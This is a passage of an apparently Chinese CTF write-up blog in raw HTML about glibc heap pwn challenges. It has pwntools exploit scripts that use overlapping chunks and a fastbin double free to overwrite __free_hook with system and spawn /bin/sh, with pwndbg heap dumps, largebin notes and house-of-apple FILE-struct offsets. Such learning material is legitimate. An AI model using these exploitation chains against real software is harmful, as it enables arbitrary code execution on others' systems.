class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)   <span class="hljs-comment"># chunk7</span><br><br>show(<span class="hljs-number">8</span>)<br><br>libc_base = addr8(<span class="hljs-number">6</span>) - <span class="hljs-number">0x3ebca0</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br><br>free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span><br>system = libc_base + <span class="hljs-number">0x4f420</span><br><br>info(<span class="hljs-string">&quot;free_hook&quot;</span>, free_hook)<br>info(<span class="hljs-string">&quot;system&quot;</span>, system)<br><br><span class="hljs-comment"># chunk8 9 10是合并的</span><br><span class="hljs-comment"># dele(11) # tcache 不会和topchunk合并的 不删也能通</span><br>dele(<span class="hljs-number">9</span>)<br><br><span class="hljs-comment"># 从最开始chunk8开始写</span><br><span class="hljs-comment"># 溢出uaf 写入system</span><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook))<br><span class="hljs-comment">#dele(12)</span><br><br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">15</span>, <span class="hljs-number">0x20</span>, p64(system))<br><br>dele(<span class="hljs-number">14</span>)<br><span class="hljs-comment">#debug()</span><br>sh()<br></code></pre></td></tr></table></figure>

<ul>
<li><p>但是有个问题是89行写12 原来的unsortedbin是0x160 写了之后应该变0x120 但是是0x100（可能为了对齐？？ 但对做题没有影响</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x55cf1b802a50 <span class="hljs-comment"># unsortedbin</span></span><br>0x55cf1b802a50:	0x0000000000000100	0x0000000000000161<br>0x55cf1b802a60:	0x00007fe2b9618ca0	0x00007fe2b9618ca0 # main_arena<br>0x55cf1b802a70:	0x0000000000000000	0x0000000000000000<br>0x55cf1b802a80:	0x0000000000000000	0x0000000000000031 # 放入tcache<br>0x55cf1b802a90:	0x0000000000000000	0x000055cf1b802010 # 指向最开始0x251的chunk(存放tcache结构体？？？)<br>0x55cf1b802aa0:	0x4141414141414141	0x4141414141414141<br>0x55cf1b802ab0:	0x0000000000000160	0x0000000000000100<br><br>------------------------------------------------------------------------<br>Allocated chunk | PREV_INUSE # 原chunk8 现chunk12<br>Addr: 0x55c221d28a50<br>Size: 0x41<br><br>Free chunk (unsortedbin)<br>Addr: 0x55c221d28a90<br>Size: 0x100<br>fd: 0x7ffbf434dca0<br>bk: 0x7ffbf434dca0<br><br>Allocated chunk<br>Addr: 0x55c221d28b90<br>Size: 0x00<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x55c221d28a50 <span class="hljs-comment"># unsortedbin</span></span><br>0x55c221d28a50:	0x0000000000000100	0x0000000000000041 # 原chunk8<br>0x55c221d28a60:	0x4141414141414141	0x4141414141414141<br>0x55c221d28a70:	0x4141414141414141	0x4141414141414141<br>0x55c221d28a80:	0x4141414141414141	0x0000000000000031 # 原chunk9<br>0x55c221d28a90:	0x00007ffbf434f8e8	0x0000000000000100 # fd:free_hook 这里变成unsortedbin起始 但size0x100<br>0x55c221d28aa0:	0x00007ffbf434dca0	0x00007ffbf434dca0 # main_arean<br>0x55c221d28ab0:	0x0000000000000160	0x0000000000000100 # 原chunk10<br>0x55c221d28ac0:	0x0000000000000041	0x0000000000000000<br>0x55c221d28ad0:	0x0000000000000000	0x0000000000000000<br>0x55c221d28ae0:	0x0000000000000000	0x0000000000000000<br>0x55c221d28af0:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b00:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b10:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b20:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b30:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b40:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b50:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b60:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b70:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b80:	0x0000000000000000	0x0000000000000000<br>0x55c221d28b90:	0x0000000000000000	0x0000000000000000<br>0x55c221d28ba0:	0x0000000000000000	0x0000000000000000<br>0x55c221d28bb0:	0x0000000000000120	0x0000000000000030<br>0x55c221d28bc0:	0x0000000000000043	0x0000000000000000<br>0x55c221d28bd0:	0x0000000000000000	0x0000000000000000<br></code></pre></td></tr></table></figure>
</li>
<li><p>官方题解用了fastbin 就可以double free了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = elf.libc<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size, content</span>):<br>   io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>   io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>   io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>   io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>   io.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>):<br>   add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">10</span>):<br>   delete(i)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 合并chunk0 1 2</span><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x170</span>))<br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># overlapping</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)   <span class="hljs-comment"># 相当于add(0xf8) 只是分了两次 并产生了分割</span><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br><br>unsorted = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = unsorted - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># 前2个是unsortedbin中的 剩下0x21进入smallbin 然后从topchunk中分配 不是从tcache中</span><br>   add(i, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>   delete(i)<br><br>delete(<span class="hljs-number">3</span>) <span class="hljs-comment"># 进入fastbin</span><br>delete(<span class="hljs-number">12</span>) <span class="hljs-comment"># 进入fastbin</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 是id=3的chunk double free</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>   add(i, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, p64(free_hook))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x68</span>, p64(system))<br><br>delete(<span class="hljs-number">3</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5603132f7000<br>Size: 0x251<br><br>Free chunk (unsortedbin) | PREV_INUSE<br>Addr: 0x5603132f7250<br>Size: 0x271<br>fd: 0x7f69f8529ca0<br>bk: 0x7f69f8529ca0<br><br>-------------------------------------------------------<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5587433c9000<br>Size: 0x251<br><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5587433c9250<br>Size: 0x81<br><br>Allocated chunk | PREV_INUSE<br>Addr: 0x5587433c92d0<br>Size: 0x81<br><br>Free chunk (unsortedbin) | PREV_INUSE<br>Addr: 0x5587433c9350<br>Size: 0x171<br>fd: 0x7fbf2c9e7ca0<br>bk: 0x7fbf2c9e7ca0<br><br>--------------------------------------------------------<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x559a66a40250</span><br>0x559a66a40250:	0x0000000000000000	0x0000000000000081 #原chunk0_0xf8 现chunk0_0x78<br>0x559a66a40260:	0x00007f0266000a61	0x00007f02665f4f00<br>0x559a66a40270:	0x0000000000000000	0x0000000000000000<br>0x559a66a40280:	0x0000000000000000	0x0000000000000000<br>0x559a66a40290:	0x0000000000000000	0x0000000000000000<br>0x559a66a402a0:	0x0000000000000000	0x0000000000000000<br>0x559a66a402b0:	0x0000000000000000	0x0000000000000000<br>0x559a66a402c0:	0x0000000000000000	0x0000000000000000<br>0x559a66a402d0:	0x0000000000000000	0x0000000000000081 # 现chunk2_0x78<br>0x559a66a402e0:	0x00007f0266000a61	0x00007f02665f4ca0<br>0x559a66a402f0:	0x0000000000000000	0x0000000000000000<br>0x559a66a40300:	0x0000000000000000	0x0000000000000000<br>0x559a66a40310:	0x0000000000000000	0x0000000000000000<br>0x559a66a40320:	0x0000000000000000	0x0000000000000000<br>0x559a66a40330:	0x0000000000000000	0x0000000000000000<br>0x559a66a40340:	0x0000000000000000	0x0000000000000000<br>0x559a66a40350:	0x0000000000000100	0x0000000000000071 # 原chunk1_0x68 现chunk3<br>0x559a66a40360:	0x00007f0266000a61	0x00007f02665f4ca0<br>0x559a66a40370:	0x6161616161616161	0x6161616161616161<br>0x559a66a40380:	0x6161616161616161	0x6161616161616161<br>0x559a66a40390:	0x6161616161616161	0x6161616161616161<br>0x559a66a403a0:	0x6161616161616161	0x6161616161616161<br>0x559a66a403b0:	0x6161616161616161	0x6161616161616161<br>0x559a66a403c0:	0x0000000000000170	0x0000000000000071<br>0x559a66a403d0:	0x0000000000000000	0x0000559a66a40010<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Elden-Ring-Ⅲ"><a href="#Elden-Ring-Ⅲ" class="headerlink" title="Elden Ring Ⅲ"></a>Elden Ring Ⅲ</h3><ul>
<li><p>largebin uaf 还是用不了给的附件 全绿</p>
</li>
<li><p>啊我懂了 可以用<code>--replace-needed</code> 第一个参数写默认给的libc路径(可以用ldd查到)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">(pwn) ╭─yech0@pwn ~ <br>╰─$ ldd ./vuln<br>	linux-vdso.so.1 (0x00007fff955d0000)<br>	./2.32-0ubuntu3.2_amd64/libc.so.6 =&gt; not found<br>(pwn) ╭─yech0@pwn ~ <br>╰─$ patchelf --set-interpreter /home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so --replace-needed ./2.32-0ubuntu3.2_amd64/libc.so.6 /home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6 vuln<br>(pwn) ╭─yech0@pwn ~ <br>╰─$ ldd ./vuln<br>	linux-vdso.so.1 (0x00007fffa2df2000)<br>	/home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6 (0x00007f2d6f214000)<br>	/home/yech0/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f2d6f409000)<br></code></pre></td></tr></table></figure>
</li>
<li><p>largebin相关的基础</p>
<blockquote>
<p><strong>Large Bin</strong></p>
<ul>
<li>large bin中一共包括63个bin，每个bin中的chunk大小不一致，而是出于一定区间范围内。此外这63个bin被分成了6组，每组bin中的chunk之间的公差一致<br> <strong>Large chunk的微观结构</strong></li>
</ul>
<p>大于512（1024）字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的</p>
<p>被释放进Large Bin中的chunk，除了以前经常见到的prev_size、size、fd、bk之外，还具有fd_nextsize和bk_nextsize:</p>
<p>   fd_nextsize，bk_nextsize：只有chunk可先的时候才使用，不过用于较大的chunk（large chunk）<br>   fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针<br>   bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针<br>   一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适chunk时挨个遍历</p>
<p><strong>Large Bin的插入顺序</strong></p>
<p>在index相同的情况下：</p>
<p>1、按照大小，从大到小排序（小的链接large bin）<br>2、如果大小相同，按照free的时间排序<br>3、多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0<br>4、size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk<br>————————————————</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/112825556">https://blog.csdn.net/qq_41202237/article/details/112825556</a></p>
<p>FIFO：将先进入的chunk设置为链头，后面插入chunk在链头的后面，取出时取出链头的下一个chunk。</p>
<p>从largebin中取的时候从小的开始(不同size范围的链表中小的   同一链表中小的chunk)</p>
<p><a target="_blank" rel="noopener" href="https://pic3.zhimg.com/v2-013b4b50d1e03e09f6dab79bcfb97e52_r.jpg">https://pic3.zhimg.com/v2-013b4b50d1e03e09f6dab79bcfb97e52_r.jpg</a></p>
<p>也就是说 从largebin中size最小的链表的第二个chunk取 剩下的部分进入unsortedbin(unsortedbin也是FIFO 双向链表都是)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;add(<span class="hljs-number">0</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin</span><br>&gt;add(<span class="hljs-number">1</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">2</span>, <span class="hljs-number">0x800</span>) <span class="hljs-string">&#x27;&#x27;&#x27;0x800-0x830 largebin&#x27;&#x27;&#x27;</span><br>&gt;add(<span class="hljs-number">3</span>, <span class="hljs-number">0x600</span>) <br>&gt;add(<span class="hljs-number">4</span>, <span class="hljs-number">0x800</span>) <span class="hljs-string">&#x27;&#x27;&#x27;0x800-0x830 largebin&#x27;&#x27;&#x27;</span><br>&gt;add(<span class="hljs-number">5</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">6</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin </span><br>&gt;add(<span class="hljs-number">7</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">8</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin </span><br>&gt;add(<span class="hljs-number">9</span>, <span class="hljs-number">0x600</span>)<br>&gt;add(<span class="hljs-number">10</span>, <span class="hljs-number">0x700</span>) <span class="hljs-comment"># 0x700-0x730 largebin </span><br>&gt;add(<span class="hljs-number">11</span>, <span class="hljs-number">0x600</span>)<br>&gt;delete(<span class="hljs-number">0</span>)<br>&gt;delete(<span class="hljs-number">2</span>)<br>&gt;delete(<span class="hljs-number">4</span>)<br>&gt;delete(<span class="hljs-number">6</span>)<br>&gt;delete(<span class="hljs-number">8</span>)<br>&gt;delete(<span class="hljs-number">10</span>)<br><br>&gt;add(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>) <span class="hljs-comment"># chunk6</span><br></code></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>house of apple   <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61670993/article/details/136233121">https://blog.csdn.net/qq_61670993/article/details/136233121</a></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a> </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">amd64：</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x0:<span class="hljs-string">&#x27;_flags&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x8:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x10:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x18:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x20:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x28:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x30:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x38:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x40:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x48:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x50:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x58:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x60:<span class="hljs-string">&#x27;_markers&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x68:<span class="hljs-string">&#x27;_chain&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x70:<span class="hljs-string">&#x27;_fileno&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x74:<span class="hljs-string">&#x27;_flags2&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x78:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x80:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x82:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x83:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x88:<span class="hljs-string">&#x27;_lock&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x90:<span class="hljs-string">&#x27;_offset&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0x98:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xa0:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xa8:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xb0:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xb8:<span class="hljs-string">&#x27;__pad5&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xc0:<span class="hljs-string">&#x27;_mode&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xc4:<span class="hljs-string">&#x27;_unused2&#x27;</span>,</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0xd8:<span class="hljs-string">&#x27;vtable&#x27;</span></span><br></code></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 